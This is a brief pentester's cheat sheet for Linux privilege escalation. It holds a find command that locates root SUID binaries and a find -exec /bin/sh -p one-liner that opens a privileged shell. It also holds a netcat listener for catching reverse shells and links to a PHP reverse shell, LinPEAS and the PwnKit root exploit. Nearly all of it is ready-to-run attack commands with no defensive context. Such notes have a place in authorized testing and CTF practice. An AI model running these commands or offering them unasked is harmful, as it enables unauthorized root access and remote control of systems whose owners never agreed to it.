# Privilege Escalation

## https://gtfobins.github.io/

## SUID executables
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

find xxx -exec whoami \;

find . -exec /bin/sh -p \; -quit


## Reverse Shell

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

sudo nc -lvnp 443

## LinPeas
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

## PwnKit
https://github.com/ly4k/PwnKit
